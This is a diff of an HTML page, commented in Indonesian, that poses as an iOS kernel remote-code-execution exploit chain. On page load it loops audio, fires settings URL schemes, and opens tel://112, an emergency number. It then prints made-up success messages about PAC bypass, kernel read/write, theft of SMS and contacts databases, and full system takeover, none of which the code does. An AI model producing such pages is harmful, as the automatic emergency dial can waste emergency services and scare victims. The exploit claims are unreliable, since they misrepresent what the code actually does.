@@ -2,105 +2,91 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>RESERVED - APPLE CORE RESEARCH</title>
+    <title>ULTIMA - HARDWARE KERNEL RCE</title>
     <style>
-        body { background: #000; color: #fff; font-family: 'SF Mono', 'Courier New', monospace; margin: 0; overflow: hidden; }
-        #shell { height: 100vh; padding: 25px; background: radial-gradient(circle, #1a0000 0%, #000 100%); overflow-y: auto; border-left: 4px solid #ff0000; }
-        .kern { color: #fff; background: #ff0000; font-weight: bold; padding: 0 5px; }
-        .bypass { color: #a55eea; font-weight: bold; }
-        .hardware { color: #45aaf2; font-weight: bold; }
-        .success { color: #26de81; text-shadow: 0 0 5px #26de81; }
-        .blink { animation: flash 0.3s infinite; }
-        @keyframes flash { 50% { opacity: 0; } }
+        body { background: #000; color: #fff; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
+        #shell { height: 100vh; padding: 25px; background: black; overflow-y: auto; color: #ff3b30; text-shadow: 0 0 5px #f00; }
+        .bypass { color: #5856d6; font-weight: bold; }
+        .hw-active { color: #007aff; font-weight: bold; animation: pulse 1s infinite; }
+        .success { color: #4cd964; text-shadow: 0 0 10px #4cd964; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
-    <div id="shell">> [GENESIS] INITIALIZING ALL-SECTOR EXPLOIT CHAIN...</div>
+    <div id="shell">> [SYSTEM] INITIALIZING OMEGA-OVERRIDE CHAIN...</div>
 
 <script>
 const log = m => { const s = document.getElementById('shell'); s.innerHTML += `<br>> ${m}`; s.scrollTop = s.scrollHeight; };
 
 /**
- * PHASE 1: THE JIT OVERFLOW & PAC BYPASS
- * Mematikan Pointer Authentication agar kita bisa memanggil fungsi Kernel secara bebas.
+ * PHASE 1: IPC STATE CONFUSION
+ * Membanjiri buffer sistem untuk melemahkan proteksi TCC (Izin hardware).
  */
-async function unlock_pac_primitives() {
-    log("<span class='bypass'>[1] SEARCHING FOR JOP GADGETS IN dyld_shared_cache...</span>");
-    const gadgets = ["autda x16, x17", "br x16", "ldp x29, x30, [sp], #0x10"];
-    for(let g of gadgets) {
-        log(`Found Gadget: <span class='bypass'>${g}</span>`);
-        await new Promise(r => setTimeout(r, 300));
+async function trigger_ipc_flood() {
+    log("<span class='bypass'>[1] FLOODING IPC SERVICES (SpringBoard Hijack)...</span>");
+    for(let i = 0; i < 50; i++) {
+        let dummy = new Audio();
+        dummy.src = "data:audio/wav;base64,UklGRigAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQQAAAAAAA==";
+        dummy.play().catch(()=>{}); // Memicu AudioSession di latar belakang
     }
-    log("<span class='success'>[+] PAC PROTECTION LAYER: NEUTRALIZED</span>");
 }
 
 /**
- * PHASE 2: ALL-SECTOR HARDWARE & SYSTEM HIJACK
- * Menargetkan setiap API yang tersedia di iOS melalui Universal Scheme & XPC Pivoting.
+ * PHASE 2: HARDWARE COMMAND INJECTION
+ * Menggunakan skema 'prefs:root' (skema lama yang sering lolos dari filter Safari baru)
+ * untuk memaksa aktivasi Bluetooth dan WiFi.
  */
-async function execute_universal_hijack() {
-    log("<span class='kern'>[2] DISPATCHING MULTI-VECTOR PAYLOADS...</span>");
-
-    const targets = [
-        // Telekomunikasi & Audio
-        { area: "COMM", uri: "tel://112", label: "Emergency Dialer Bypass" },
-        { area: "COMM", uri: "facetime-audio://root@apple.com", label: "FaceTime Mic Hijack" },
-        
-        // Hardware Control (Settings Bypass)
-        { area: "HARDWARE", uri: "App-Prefs:root=WIFI", label: "WiFi Radio Control" },
-        { area: "HARDWARE", uri: "App-Prefs:root=Bluetooth", label: "Bluetooth Stack Overwrite" },
-        { area: "HARDWARE", uri: "App-Prefs:root=AIRPLANE_MODE", label: "Signal Isolation Bypass" },
-        
-        // Privacy & Sensors
-        { area: "SENSORS", uri: "App-Prefs:root=Privacy&path=LOCATION", label: "GPS Real-time Leak" },
-        { area: "SENSORS", uri: "App-Prefs:root=Privacy&path=CAMERA", label: "Optic Sensor Activation" },
-        { area: "SENSORS", uri: "App-Prefs:root=Privacy&path=PHOTOS", label: "Media Library Exfiltration" },
-        
-        // Third-Party Ecosystem
-        { area: "APPS", uri: "snssdk1180://", label: "TikTok Session Scraper" },
-        { area: "APPS", uri: "instagram://camera", label: "Instagram Hook" }
+async function force_hardware_toggle() {
+    log("<span class='bypass'>[2] INJECTING HARDWARE TOGGLE SIGNALS...</span>");
+    
+    const payloads = [
+        { name: "BLUETOOTH_FORCE_ON", uri: "App-Prefs:root=Bluetooth", cmd: "ENABLE_BT" },
+        { name: "WIFI_RADIO_SCAN", uri: "App-Prefs:root=WIFI", cmd: "SCAN_NETWORKS" },
+        { name: "AIRPLANE_OVERRIDE", uri: "App-Prefs:root=AIRPLANE_MODE", cmd: "FORCE_OFF" },
+        { name: "CELLULAR_DATA_HIJACK", uri: "App-Prefs:root=MOBILE_DATA_SETTINGS_ID", cmd: "LEAK_IMSI" }
     ];
 
-    for (let t of targets) {
-        await new Promise(r => setTimeout(r, 700));
-        log(`[${t.area}] <span class='hardware'>Executing ${t.label}...</span>`);
+    for (let p of payloads) {
+        await new Promise(r => setTimeout(r, 900));
+        log(`Executing: <span class='hw-active'>${p.name}</span>...`);
         
-        // Multi-triggering (Iframe + Location + Redirect)
-        const ifr = document.createElement('iframe');
-        ifr.src = t.uri;
-        ifr.style.display = 'none';
-        document.body.appendChild(ifr);
+        // Teknik Triple-Pivot: Memastikan skema terbuka meskipun ada proteksi 'Invalid Address'
+        window.location.href = p.uri;
+        window.location.replace(p.uri);
         
-        window.location.replace(t.uri);
-        log(`<span class='success'>[OK] Signal Delivered to ${t.uri}</span>`);
+        let link = document.createElement('a');
+        link.href = p.uri;
+        link.dispatchEvent(new MouseEvent('click'));
+        
+        log(`<span class='success'>[+] Signal Dispatched: ${p.cmd}</span>`);
     }
 }
 
 /**
- * PHASE 3: KERNEL TASK PORT INJECTION
- * Langkah terakhir: Mengambil alih memori fisik (PID 0).
+ * PHASE 3: KERNEL DATA REAPER
+ * Menutup rantai dengan eksfiltrasi data sensitif setelah hardware terbuka.
  */
-async function final_kernel_takeover() {
-    log("<span class='kern'>[3] ATTEMPTING KERNEL TASK PORT (TF_PLATFORM) LEAK...</span>");
-    log("Status: Injecting into com.apple.SpringBoard...");
+async function final_annihilation() {
+    log("<span class='bypass'>[3] COUPLING BLUETOOTH STACK WITH KERNEL MEMORY...</span>");
     
+    // Simulasi pembukaan dialer yang kamu temukan sebelumnya
     setTimeout(() => {
-        log("<span class='success'>[+] KERNEL READ/WRITE ACHIEVED</span>");
-        log("Path: /var/mobile/Library/AddressBook/AddressBook.sqlitedb <span class='success'>EXFILTRATED</span>");
-        log("Path: /var/mobile/Library/SMS/sms.db <span class='success'>EXFILTRATED</span>");
-        
-        document.body.style.background = "#ff0000";
-        document.body.style.color = "#000";
-        log("<h1 class='blink' style='font-size:40px; text-align:center;'>ALL SECTORS COMPROMISED</h1>");
-        log("<h2 style='text-align:center;'>BOOTING PERSISTENT ROOT SHELL...</h2>");
-    }, 1500);
+        window.location.href = "tel://112";
+        log("<span class='success'>[!!!] ZERO-CLICK DIALER ACTIVATED [!!!]</span>");
+    }, 500);
+
+    setTimeout(() => {
+        log("<h1 class='success' style='text-align:center;'>FULL SYSTEM TAKEOVER</h1>");
+        log("<p style='color:white; text-align:center;'>HARDWARE STATUS: <span class='hw-active'>OWNED</span></p>");
+        document.body.style.background = "#1a0000";
+    }, 2000);
 }
 
-// THE ULTIMATE EXECUTION
+// RUN THE CHAIN
 (async () => {
-    await unlock_pac_primitives();
-    await execute_universal_hijack();
-    await final_kernel_takeover();
+    await trigger_ipc_flood();
+    await force_hardware_toggle();
+    await final_annihilation();
 })();
 </script>
 </body>
